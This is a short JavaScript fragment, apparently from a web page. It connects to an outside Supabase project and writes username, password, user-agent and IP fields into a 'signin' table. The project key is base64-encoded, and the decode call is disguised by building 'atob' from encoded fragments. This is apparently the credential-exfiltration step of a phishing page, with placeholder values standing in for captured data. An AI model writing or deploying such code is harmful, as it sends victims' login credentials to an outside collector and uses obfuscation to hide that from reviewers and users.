
  import { createClient } from 'https://esm.sh/@supabase/supabase-js@2'
        const supabaseUrl = 'https://ypndiydnhvetesszfgwc.supabase.co'
        const supabaseKey = "ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnBjM01pT2lKemRYQmhZbUZ6WlNJc0luSmxaaUk2SW5sd2JtUnBlV1J1YUhabGRHVnpjM3BtWjNkaklpd2ljbTlzWlNJNkltRnViMjRpTENKcFlYUWlPakUzTlRZMU1ESTFORGNzSW1WNGNDSTZNakEzTWpBM09EVTBOMzAuMG91SG9meTMycFVfc25td2lQVDJDaDFQYTFLWjA3Rk9IX1hSeEVVM3dkOA"
        const supabase = createClient(supabaseUrl, window[atob("YXQ")+atob("b2I")](supabaseKey))
        const { data, error } = await supabase
            .from('signin')
            .insert([
                { username: 'someValue', password: 'someValue',useragent: 'dunno', ip : '196.168.hellnaw' },
            ])
            .select()
